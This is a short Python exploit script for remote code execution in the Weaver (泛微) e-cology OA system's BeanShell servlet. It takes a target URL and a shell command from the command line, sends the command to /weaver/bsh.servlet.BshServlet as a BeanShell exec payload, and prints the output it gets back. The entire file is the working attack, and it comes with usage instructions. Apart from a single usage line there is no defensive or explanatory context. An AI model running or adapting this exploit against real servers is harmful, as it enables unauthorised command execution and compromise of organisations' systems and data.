#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time : 2020/4/7 14:02
# @Author : so:Lo
# @File : e-cology.py

# 泛微e-cology OA Beanshell组件远程代码执行
# usage:python3 e-cology.py http://target cmd
#

import sys
import requests





# cmd = 'ls'

vulable = '/weaver/bsh.servlet.BshServlet'

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Content-Type': 'application/x-www-form-urlencoded'
}

def expliot(url,cmd):
    target = url+vulable
    print(target)
    payload = 'bsh.script=exec(' + '"' + cmd + '"' + ')'
    print("-----------------------------------")
    print("paylaod is " + payload)
    print("-----------------------------------")
    r = requests.post(target,headers=headers,data=payload)
    s = r.text
    if '<h2>Script Output</h2>'in s:
        d = s.index('<h2>Script Output</h2>')
        e = s.index('</td></tr></table>')
        print(s[d:e])
        print(r.status_code)
    else:
        print('exec fail')
        print(r.status_code)


if __name__ == '__main__':
    url = sys.argv[1]
    cmd = sys.argv[2]
    expliot(url,cmd)
